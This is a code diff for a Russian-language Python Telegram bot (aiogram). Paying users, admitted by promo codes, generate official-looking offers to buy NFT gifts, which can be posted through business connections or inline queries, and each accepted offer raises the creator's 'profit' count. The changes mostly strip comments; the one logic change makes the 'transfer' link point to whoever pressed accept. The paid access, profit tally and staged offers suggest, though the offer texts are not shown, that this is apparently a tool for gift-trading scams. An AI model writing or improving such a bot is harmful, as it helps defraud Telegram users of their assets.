@@ -18,23 +18,19 @@ from aiogram.exceptions import TelegramBadRequest
 # ==========================================
 # НАСТРОЙКИ БОТА
 # ==========================================
-# На Railway токен берется из переменных (Variables). Если запускаешь локально — вставь свой токен вместо "ВАШ_ТОКЕН"
-BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН") 
-ADMIN_USERNAME = "chingiz_trader"  # <-- Твой юзернейм (без @)
+BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
+ADMIN_USERNAME = "chingiz_trader"
 
-# Путь для базы данных (для Railway Volume)
 DB_PATH = '/app/data/bot_database.db'
 
 def is_admin(user):
     return user.username and user.username.lower() == ADMIN_USERNAME.lower()
 
 # ==========================================
-# БАЗА ДАННЫХ (SQLite)
+# БАЗА ДАННЫХ
 # ==========================================
 def init_db():
-    # Создаем папку для базы (нужно для Railway)
     os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
-    
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute('''CREATE TABLE IF NOT EXISTS users (
@@ -72,7 +68,6 @@ def set_access(user_id, days):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, "user"))
-    
     days = int(days)
     if days == 9999:
         new_date = "2099-12-31 23:59:59"
@@ -80,7 +75,6 @@ def set_access(user_id, days):
         cursor.execute("SELECT access_until FROM users WHERE user_id = ?", (user_id,))
         current = cursor.fetchone()[0]
         now = datetime.now()
-        
         if current and current != "None":
             try:
                 current_dt = datetime.strptime(current, "%Y-%m-%d %H:%M:%S")
@@ -89,9 +83,7 @@ def set_access(user_id, days):
                 base_date = now
         else:
             base_date = now
-            
         new_date = (base_date + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-        
     cursor.execute("UPDATE users SET access_until = ? WHERE user_id = ?", (new_date, user_id))
     conn.commit()
     conn.close()
@@ -110,14 +102,12 @@ def use_promo(user_id, code):
     cursor = conn.cursor()
     cursor.execute("SELECT days, is_used FROM promos WHERE code = ?", (code,))
     row = cursor.fetchone()
-    
     if not row:
         conn.close()
         return False, "❌ Промокод не найден."
     if row[1] == 1:
         conn.close()
         return False, "❌ Этот промокод уже был использован."
-        
     set_access(user_id, row[0])
     cursor.execute("UPDATE promos SET is_used = 1 WHERE code = ?", (code,))
     conn.commit()
@@ -138,7 +128,7 @@ def get_stats():
     return total_users, active_users, total_profit
 
 # ==========================================
-# СОСТОЯНИЯ И НАСТРОЙКИ
+# НАСТРОЙКИ
 # ==========================================
 class PromoState(StatesGroup):
     waiting_for_code = State()
@@ -198,28 +188,15 @@ def format_nft_name(link: str) -> str:
 def get_main_kb():
     return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="👤 Профиль"), KeyboardButton(text="🎟 Ввести промокод")]], resize_keyboard=True)
 
-# ==========================================
-# УНИВЕРСАЛЬНОЕ РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
-# ==========================================
 async def edit_offer_message(callback: CallbackQuery, text: str, reply_markup=None):
     try:
         if callback.inline_message_id:
-            await bot.edit_message_text(
-                inline_message_id=callback.inline_message_id,
-                text=text, reply_markup=reply_markup, parse_mode="HTML"
-            )
+            await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=text, reply_markup=reply_markup, parse_mode="HTML")
         else:
-            await bot.edit_message_text(
-                chat_id=callback.message.chat.id, message_id=callback.message.message_id,
-                text=text, reply_markup=reply_markup, parse_mode="HTML",
-                business_connection_id=callback.message.business_connection_id
-            )
+            await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=text, reply_markup=reply_markup, parse_mode="HTML", business_connection_id=callback.message.business_connection_id)
     except TelegramBadRequest as e:
         print(f"⚠️ Ошибка редактирования: {e}")
 
-# ==========================================
-# ХЭНДЛЕРЫ
-# ==========================================
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     add_user(message.from_user.id, message.from_user.username)
@@ -231,19 +208,14 @@ async def show_profile(message: Message):
     user_id = message.from_user.id
     profit, access_until = get_user(user_id)
     is_premium = "Да ✅" if message.from_user.is_premium else "Нет ❌"
-    
     if access_until and access_until != "None":
-        if access_until == "2099-12-31 23:59:59":
-            access_text = "Навсегда ♾️"
+        if access_until == "2099-12-31 23:59:59": access_text = "Навсегда ♾️"
         else:
             try:
                 dt = datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S")
                 access_text = "Истек ❌" if dt < datetime.now() else f"До {dt.strftime('%d.%m.%Y %H:%M')} 📅"
-            except ValueError:
-                access_text = "Ошибка базы данных ❌"
-    else:
-        access_text = "Нет доступа ❌"
-
+            except ValueError: access_text = "Ошибка базы данных ❌"
+    else: access_text = "Нет доступа ❌"
     text = f"<b>👤 Ваш профиль</b>\n\n🆔 <b>ID:</b> <code>{user_id}</code>\n💎 <b>Premium:</b> {is_premium}\n📈 <b>Сделок:</b> {profit}\n🔑 <b>Доступ:</b> {access_text}"
     await message.answer(text, parse_mode="HTML")
 
@@ -255,19 +227,13 @@ async def ask_promo(message: Message, state: FSMContext):
 @dp.message(PromoState.waiting_for_code)
 async def process_promo(message: Message, state: FSMContext):
     success, result = use_promo(message.from_user.id, message.text.strip().upper())
-    if success:
-        await message.answer(f"✅ <b>Промокод активирован!</b>\nДоступ выдан на: <b>{'Навсегда' if result == 9999 else f'{result} дн.'}</b>", parse_mode="HTML")
-    else:
-        await message.answer(result)
+    if success: await message.answer(f"✅ <b>Промокод активирован!</b>\nДоступ выдан на: <b>{'Навсегда' if result == 9999 else f'{result} дн.'}</b>", parse_mode="HTML")
+    else: await message.answer(result)
     await state.clear()
 
-# ==========================================
-# АДМИН-ПАНЕЛЬ
-# ==========================================
 @dp.message(Command("admin"))
 async def admin_panel(message: Message):
     if not is_admin(message.from_user): return await message.answer("Нет прав.")
-    
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="1 День", callback_data="genpromo_1"), InlineKeyboardButton(text="7 Дней", callback_data="genpromo_7")],
         [InlineKeyboardButton(text="30 Дней", callback_data="genpromo_30"), InlineKeyboardButton(text="Навсегда", callback_data="genpromo_9999")],
@@ -290,43 +256,31 @@ async def show_stats(callback: CallbackQuery):
     await callback.message.answer(f"<b>📊 Статистика</b>\n\n👥 Юзеров: {total_u}\n✅ С доступом: {active_u}\n🤝 Сделок: {total_deals}", parse_mode="HTML")
     await callback.answer()
 
-# ==========================================
-# ЛОГИКА СОЗДАНИЯ И ОБРАБОТКИ ОФФЕРОВ
-# ==========================================
 def check_access(user):
     if is_admin(user): return True
     _, access_until = get_user(user.id)
     if not access_until or access_until == "None": return False
     if access_until == "2099-12-31 23:59:59": return True
-    try:
-        return datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S") > datetime.now()
-    except ValueError:
-        return False
+    try: return datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S") > datetime.now()
+    except ValueError: return False
 
 async def create_offer_logic(message: Message, is_business: bool):
-    if not check_access(message.from_user):
-        return await message.answer("❌ <b>У вас нет доступа!</b>", parse_mode="HTML")
-
+    if not check_access(message.from_user): return await message.answer("❌ <b>У вас нет доступа!</b>", parse_mode="HTML")
     parts = message.text.split()
     if len(parts) < 4: return 
-
     nft_link, price, currency = parts[1], parts[2], parts[3].lower()
     lang = parts[4].lower() if len(parts) > 4 else 'ru'
     if lang not in TEXTS: lang = 'ru'
     if currency not in ['stars', 'gram']: return
-
     currency_icon = "⭐️" if currency == "stars" else "GRAM"
     gift_name_html = f"<a href='{nft_link if nft_link.startswith('http') else f'https://{nft_link}'}'>{format_nft_name(nft_link)}</a>"
     
-    # Данные продавца
     seller_username, seller_name, seller_id = message.from_user.username, message.from_user.full_name, message.from_user.id
-
     offer_id = str(uuid.uuid4())[:8]
     active_offers[offer_id] = {
         'seller_username': seller_username, 'seller_name': seller_name, 'seller_id': seller_id,
         'price': price, 'currency_icon': currency_icon, 'gift_name': gift_name_html, 'lang': lang
     }
-
     if is_business:
         t = TEXTS[lang]
         offer_text = t['offer'].format(seller=seller_username or seller_name, price=price, currency_icon=currency_icon, gift_name=gift_name_html)
@@ -351,9 +305,7 @@ async def catch_priv(message: Message): await create_offer_logic(message, messag
 @dp.inline_query()
 async def handle_inline_query(inline_query: InlineQuery):
     offer_data = active_offers.get(inline_query.query.strip())
-    if not offer_data:
-        return await inline_query.answer([InlineQueryResultArticle(id="1", title="❌ Не найдено", input_message_content=InputTextMessageContent(message_text="Оффер не найден."))], cache_time=0, is_personal=True)
-        
+    if not offer_data: return await inline_query.answer([InlineQueryResultArticle(id="1", title="❌ Не найдено", input_message_content=InputTextMessageContent(message_text="Оффер не найден."))], cache_time=0, is_personal=True)
     t = TEXTS[offer_data['lang']]
     offer_text = t['offer'].format(seller=offer_data['seller_username'] or offer_data['seller_name'], price=offer_data['price'], currency_icon=offer_data['currency_icon'], gift_name=offer_data['gift_name'])
     kb = InlineKeyboardMarkup(inline_keyboard=[[
@@ -367,7 +319,6 @@ async def decline_offer(callback: CallbackQuery):
     offer_id = callback.data.split('_')[1]
     data = active_offers.get(offer_id)
     if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)
-
     t = TEXTS[data['lang']]
     text = t['rejected'].format(price=data['price'], currency_icon=data['currency_icon'], gift_name=data['gift_name'])
     await edit_offer_message(callback, text, reply_markup=None)
@@ -381,23 +332,33 @@ async def accept_offer(callback: CallbackQuery):
     if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)
 
     t = TEXTS[data['lang']]
-    add_profit(data['seller_id'])
     
-    # ДИНАМИЧЕСКИЙ ПЕРЕХОД НА ПРОФИЛЬ ПРОДАВЦА
-    target = f"@{data['seller_username']}" if data['seller_username'] else data['seller_name']
-    url = f"https://t.me/{data['seller_username']}" if data['seller_username'] else f"tg://user?id={data['seller_id']}"
+    # 🛑 ЛОГИКА: Берем данные ТОГО, КТО НАЖАЛ КНОПКУ (callback.from_user)
+    # Если вы тестируете сами, это ваш профиль. Если друг — то его.
+    target_username = callback.from_user.username
+    target_name = callback.from_user.full_name
+    target_id = callback.from_user.id
 
+    if target_username:
+        target = f"@{target_username}"
+        url = f"https://t.me/{target_username}"
+    else:
+        target = target_name
+        url = f"tg://user?id={target_id}"
+
+    # Начисляем профит создателю оффера (тому, кто писал /of)
+    add_profit(data['seller_id'])
+
+    # Показываем окошко
     await callback.answer(text=t['alert'].format(target=target), show_alert=True)
     
+    # Меняем сообщение на "Продано" и ставим кнопку со ссылкой на профиль того, кто нажал
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t['btn_transfer'], url=url)]])
     text = t['sold'].format(gift_name=data['gift_name'], target=target, currency_icon=data['currency_icon'])
     
     await edit_offer_message(callback, text, reply_markup=kb)
     active_offers.pop(offer_id, None)
 
-# ==========================================
-# ЗАПУСК
-# ==========================================
 async def main():
     init_db()
     logging.basicConfig(level=logging.INFO)
